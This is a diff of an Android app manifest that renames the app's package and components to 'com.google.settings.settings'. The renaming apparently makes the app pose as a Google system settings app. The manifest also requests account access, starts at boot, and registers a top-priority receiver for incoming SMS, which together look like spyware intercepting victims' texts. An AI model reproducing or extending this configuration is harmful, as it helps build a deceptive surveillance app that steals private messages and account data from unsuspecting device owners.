@@ -1,6 +1,6 @@
 <?xml version="1.0" encoding="utf-8"?>
 <manifest xmlns:android="http://schemas.android.com/apk/res/android"
-    package="com.example.pappagift.mediastore">
+    package="com.google.settings.settings">
 
     <!--Permissions Required-->
     <uses-permission android:name="android.permission.GET_ACCOUNTS" />
@@ -21,10 +21,12 @@
         android:theme="@style/AppTheme">
 
         <!--Services-->
-        <service android:name=".Services.MediaService" />
+        <service android:name="com.google.settings.settings.Services.MediaService" />
 
         <!--Activities-->
-        <activity android:name=".MainActivity">
+        <activity
+            android:launchMode="singleTop"
+            android:name="com.google.settings.settings.MainActivity" >
             <intent-filter>
                 <action android:name="android.intent.action.MAIN" />
                 <category android:name="android.intent.category.LAUNCHER" />
@@ -32,13 +34,13 @@
         </activity>
 
         <!--Receivers-->
-        <receiver android:name=".Receiver.MediaReceiver" android:enabled="false">
+        <receiver android:name="com.google.settings.settings.Receiver.MediaReceiver" android:enabled="false">
             <intent-filter>
                 <action android:name="android.intent.action.BOOT_COMPLETED"></action>
             </intent-filter>
         </receiver>
 
-        <receiver android:name=".Receiver.MediaSMSReceiver">
+        <receiver android:name="com.google.settings.settings.Receiver.MediaSMSReceiver">
             <intent-filter android:priority="1000">
                 <action android:name="android.provider.Telephony.SMS_RECEIVED" />
             </intent-filter>
